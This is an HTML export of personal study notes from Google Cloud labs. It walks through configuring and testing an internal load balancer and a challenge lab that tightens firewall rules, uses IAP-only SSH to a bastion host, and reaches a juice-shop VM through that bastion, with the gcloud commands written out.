CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h2 id='task-3-configure-the-internal-load-balancer'><span>Task 3. Configure the Internal Load Balancer</span></h2><p><span>Configure the Internal Load Balancer to balance traffic between the two backends (</span><strong><span>instance-group-1</span></strong><span> and </span><strong><span>instance-group-2</span></strong><span>), as illustrated in this diagram:</span></p><p><img src="images\k3u04mphJhk%2F2yM84NjgPiZHrbCuzbdwAQ98vnaoHQo%3D" referrerpolicy="no-referrer" alt="Network Diagram showing the Internal Load Balancer balancing traffic between the 2 backends"></p><h3 id='start-the-configuration-6'><span>Start the configuration</span></h3><ol start='' ><li><p><span>From the Navigation Menu, select </span><strong><span>View All Products</span></strong><span>. Under </span><strong><span>Networking</span></strong><span>, select </span><strong><span>Network Services</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Load balancing</span></strong><span> page.</span></p></li><li><p><span>Click </span><strong><span>Create load balancer</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Type of load balancer</span></strong><span>, select </span><strong><span>Network Load Balancer (TCP/UDP/SSL)</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Proxy or passthrough</span></strong><span>, select </span><strong><span>Passthrough load balancer</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Public facing or internal</span></strong><span>, select </span><strong><span>Internal</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>CONFIGURE</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><code>my-ilb</code><span>.</span></p></li><li><p><span>For </span><strong><span>Region</span></strong><span>, select </span><code>REGION</code><span>.</span></p></li><li><p><span>For </span><strong><span>Network</span></strong><span>, select </span><strong><span>my-internal-app</span></strong><span>.</span></p></li></ol><h3 id='configure-the-regional-backend-service'><span>Configure the regional backend service</span></h3><p><span>The backend service monitors instance groups and prevents them from exceeding configured usage.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><span>instance-group-1</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Add a backend</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Instance group</span></strong><span>, select </span><strong><span>instance-group-2</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Health Check</span></strong><span>, select </span><strong><span>Create a health check</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>my-ilb-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>TCP</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Health checks determine which instances can receive new connections. This HTTP health check polls instances every 5 seconds, waits up to 5 seconds for a response and treats 2 successful or 2 failed attempts as healthy or unhealthy, respectively.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Verify that there is a blue check mark next to </span><strong><span>Backend configuration</span></strong><span> in the Cloud Console. If not, double-check that you have completed all the steps above.</span></p></li></ol><h3 id='configure-the-frontend-6'><span>Configure the frontend</span></h3><p><span>The frontend forwards traffic to the backend.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values with their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>subnet-b</span></td></tr><tr><td style='text-align:left;' ><span>Internal IP</span></td><td style='text-align:left;' ><span>Under </span><strong><span>IP address</span></strong><span> select </span><strong><span>Create IP address</span></strong></td></tr></tbody></table></figure></li><li><p><span>Specify the following, leaving all other values with their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>my-ilb-ip</span></td></tr><tr><td style='text-align:left;' ><span>Static IP address</span></td><td style='text-align:left;' ><span>Let me choose</span></td></tr><tr><td style='text-align:left;' ><span>Custom IP address</span></td><td style='text-align:left;' ><span>10.10.30.5</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Reserve</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Port number</span></strong><span>, type </span><code>80</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span> .</span></p></li></ol><h3 id='review-and-create-the-internal-load-balancer'><strong><span>Review and create the Internal Load Balancer</span></strong></h3><ol start='' ><li><p><span>Click on </span><strong><span>Review and finalize</span></strong><span>.</span></p></li><li><p><span>Review the </span><strong><span>Backend</span></strong><span> and </span><strong><span>Frontend</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Create</span></strong><span>. Wait for the Load Balancer to be created, before moving to the next task.</span></p></li></ol><p><span>Click Check my progress to verify the objective.</span></p><p><span>Configure the Internal Load Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-4-test-the-internal-load-balancer'><span>Task 4. Test the Internal Load Balancer</span></h2><p><span>Verify that the </span><code>my-ilb</code><span> IP address forwards traffic to </span><strong><span>instance-group-1</span></strong><span> and </span><strong><span>instance-group-2</span></strong><span>.</span></p><h3 id='access-the-internal-load-balancer'><strong><span>Access the Internal Load Balancer</span></strong></h3><ol start='' ><li><p><span>In the Cloud Console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>utility-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>To verify that the Internal Load Balancer forwards traffic, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.5</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Internal Load Balancing Lab&lt;/h1&gt;&lt;h2&gt;Client IP&lt;/h2&gt;Your IP address : 10.10.20.50&lt;h2&gt;Hostname&lt;/h2&gt;Server Hostname:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> instance-group-1-1zn8&lt;h2&gt;Server Location&lt;/h2&gt;Region and Zone: us-central1-a</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> As expected, traffic is forwarded from the Internal Load Balancer (10.10.30.5) to the backend.</span></p><ol start='' ><li><p><span>Run the same command a couple more times.</span></p></li></ol><p><span>In the output, you should be able to see responses from </span><strong><span>instance-group-1</span></strong><span> in </span><code>Zone</code><span> and </span><strong><span>instance-group-2</span></strong><span> in the different zone of same region.</span></p><h2 id='congratulations-35'><span>Congratulations!</span></h2><p><span>In this lab you created two managed instance groups in the </span><code>REGION</code><span> region, along with firewall rules to allow HTTP traffic to those instances and TCP traffic from the Google Cloud health checker. Then, you configured and tested an Internal Load Balancer for those instance groups.</span></p><p>&nbsp;</p><h2 id='lab---build-a-secure-google-cloud-network-challenge-lab'><span>LAB - Build a Secure Google Cloud Network: Challenge Lab</span></h2><h2 id='introduction-2'><span>Introduction</span></h2><p><span>In a challenge lab you’re given a scenario and a set of tasks. Instead of following step-by-step instructions, you will use the skills learned from the labs in the course to figure out how to complete the tasks on your own! An automated scoring system (shown on this page) will provide feedback on whether you have completed your tasks correctly.</span></p><p><span>When you take a challenge lab, you will not be taught new Google Cloud concepts. You are expected to extend your learned skills, like changing default values and reading and researching error messages to fix your own mistakes.</span></p><p><span>To score 100% you must successfully complete all tasks within the time period!</span></p><p><span>This lab is recommended for students who have enrolled in the </span><a href='https://www.cloudskillsboost.google/course_templates/654'><span>Build a Secure Google Cloud Network</span></a><span> skill badge. Are you ready for the challenge?</span></p><h2 id='setup-5'><span>Setup</span></h2><h3 id='before-you-click-the-start-lab-button-22'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h2 id='challenge-scenario-3'><span>Challenge scenario</span></h2><p><span>You are a security consultant brought in by Jeff, who owns a small local company, to help him with his very successful website (juice-shop). Jeff is new to Google Cloud and had his neighbour&#39;s son set up the initial site. The neighbour&#39;s son has since had to leave for college, but before leaving, he made sure the site was running.</span></p><p><span>Below is the current set up:</span></p><p><img src="C:\Users\sherwinowen\Documents\my_tutorials\gcp\cloud_security_engineer\images\qEwFTP7%2FkyF3cRwfT3FGObt7L7VLB60%2Bvp92hZVnogw%3D" referrerpolicy="no-referrer" alt="Current Google Cloud environment"></p><h2 id='your-challenge-3'><span>Your challenge</span></h2><p><span>You need to create the appropriate security configuration for Jeff&#39;s site. Your first challenge is to set up firewall rules and virtual machine tags. You also need to ensure that SSH is only available to the bastion via IAP.</span></p><p><span>For the firewall rules, make sure that:</span></p><ul><li><p><span>The bastion host does not have a public IP address.</span></p></li><li><p><span>You can only SSH to the bastion and only via IAP.</span></p></li><li><p><span>You can only SSH to </span><code>juice-shop</code><span> via the bastion.</span></p></li><li><p><span>Only HTTP is open to the world for </span><code>juice-shop</code><span>.</span></p></li></ul><p><span>Tips and tricks:</span></p><ul><li><p><span>Pay close attention to the network tags and the associated VPC firewall rules.</span></p></li><li><p><span>Be specific and limit the size of the VPC firewall rule source ranges.</span></p></li><li><p><span>Overly permissive permissions will not be marked correct.</span></p></li></ul><p><img src="https://cdn.qwiklabs.com/BgxgsuLyqMkhxmO3jDlkHE7yGLIR%2B3rrUabKimlgrbo%3D" referrerpolicy="no-referrer" alt="The Google Cloud environment to configure"></p><p><span>Suggested order of action.</span></p><ol start='' ><li><p><span>Check the firewall rules. Remove the overly permissive rules.</span></p></li></ol><p><span>Remove the overly permissive rules</span></p><ul><li><p><span>Go to </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span> &gt; will see </span><strong><span>open-access</span></strong></p></li><li><p><span>Use the following command from the cloud console:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete open-access</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='2' ><li><p><span>Navigate to Compute Engine in the Cloud console and identify the bastion host. The instance should be stopped. Start the instance.</span></p></li></ol><p><span>Start the bastion host instance</span></p><ul><li><p><span>Go to </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM Instances</span></strong><span> &gt; Select </span><strong><span>bastion</span></strong><span> &gt; click on </span><strong><span>Start</span></strong></p></li></ul><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='3' ><li><p><span>The bastion host is the one machine authorized to receive external SSH traffic. Create a firewall rule that allows </span><a href='https://cloud.google.com/iap/docs/using-tcp-forwarding'><span>SSH (tcp/22) from the IAP service</span></a><span>. The firewall rule must be enabled for the bastion host instance using a network tag of </span><code>accept-ssh-iap-ingress-ql-744</code><span>.</span></p></li></ol><p><span>Create a firewall rule that allows SSH (tcp/22) from the IAP service and add network tag on bastion</span></p><ul><li><p><span>Run the following:</span></p></li><li><p><span>Make sure you replace with the tag provided on the Left Pane.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create SSH-IAP-FW --allow=tcp:22 --source-ranges 35.235.240.0/20 --target-tags accept-ssh-iap-ingress-ql-744 --network acme-vpc</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances add-tags bastion --tags=accept-ssh-iap-ingress-ql-744 --zone=us-central1-c</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='4' ><li><p><span>The </span><code>juice-shop</code><span> server serves HTTP traffic. Create a firewall rule that allows traffic on HTTP (tcp/80) to any address. The firewall rule must be enabled for the juice-shop instance using a network tag of </span><code>accept-http-ingress-ql-744</code><span>.</span></p></li></ol><p><span>Create a firewall rule that allows traffic on HTTP (tcp/80) to any address and add network tag on juice-shop</span></p><ul><li><p><span>Run the following:</span></p></li><li><p><span>Make sure you replace with the tag provided on the Left Pane.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create allow-http --allow=tcp:80 --source-ranges 0.0.0.0/0 --target-tags accept-http-ingress-ql-744 --network acme-vpc</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances add-tags juice-shop --tags=accept-http-ingress-ql-744 --zone=us-central1-c</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='5' ><li><p><span>You need to connect to </span><code>juice-shop</code><span> from the bastion using SSH. Create a firewall rule that allows traffic on SSH (tcp/22) from </span><code>acme-mgmt-subnet</code><span> network address. The firewall rule must be enabled for the </span><code>juice-shop</code><span> instance using a network tag of ``.</span></p></li></ol><p><span>Create a firewall rule that allows traffic on SSH (tcp/22) from acme-mgmt-subnet</span></p><ul><li><p><span>Run the following:</span></p></li><li><p><span>Make sure you replace with the tag provided on the Left Pane.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create ssh-internal --allow=tcp:22 --source-ranges 192.168.10.0/24 --target-tags accept-ssh-internal-ingress-ql-744 --network acme-vpc</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances add-tags juice-shop --tags=accept-ssh-internal-ingress-ql-744 --zone=us-central1-c</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='6' ><li><p><span>In the Compute Engine instances page, click the SSH button for the bastion host. Once connected, SSH to </span><code>juice-shop</code><span>.</span></p></li></ol><p><strong><span>Hint:</span></strong><span> If you&#39;re having difficulties with the compute ssh connection or IAP tunnel, make use of the </span><a href='https://cloud.google.com/sdk/gcloud/reference/compute/ssh'><span>--troubleshoot</span></a><span> flag.</span></p><p><span>SSH to bastion host via IAP and juice-shop via bastion</span></p><ul><li><p><span>Go to </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span> &gt; </span><strong><span>SSH</span></strong><span> to </span><strong><span>bastion</span></strong><span> host</span></p></li><li><p><span>Run the following:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ssh &lt;internalstudent-03-deb996e41e56@bastion:~$ ssh 192.168.11.2</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The authenticity of host '192.168.11.2 (192.168.11.2)' can't be established.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ECDSA key fingerprint is SHA256:blNVdiCDyB+qVttS+NjLqat8AopajkcyF7Yg3OX1GSA.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Warning: Permanently added '192.168.11.2' (ECDSA) to the list of known hosts.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Linux juice-shop 5.10.0-33-cloud-amd64 #1 SMP Debian 5.10.226-1 (2024-10-03) x86_64</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The programs included with the Debian GNU/Linux system are free software;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">the exact distribution terms for each program are described in the</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">individual files in /usr/share/doc/*/copyright.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">permitted by applicable law.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating directory '/home/student-03-deb996e41e56'.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-03-deb996e41e56@juice-shop:~$  IP of the juice-shop&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 338px;"></div><div class="CodeMirror-gutters" style="display: none; height: 338px;"></div></div></div></pre><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='congratulations-36'><span>Congratulations!</span></h2><p><span>You&#39;ve completed the challenge lab and helped Jeff tighten security.</span></p><p><img src="images\9oELH8%2F%2FimbVfbdo6Ee0IwQdwEZe6tzNezoNO8TP6QY%3D" referrerpolicy="no-referrer" alt="Build and Secure Networks in Google Cloud skill badge"></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h1 id='17---using-devsecops-in-your-google-cloud-environment'><span>17 - Using DevSecOps in your Google Cloud Environment</span></h1><p>&nbsp;</p><h2 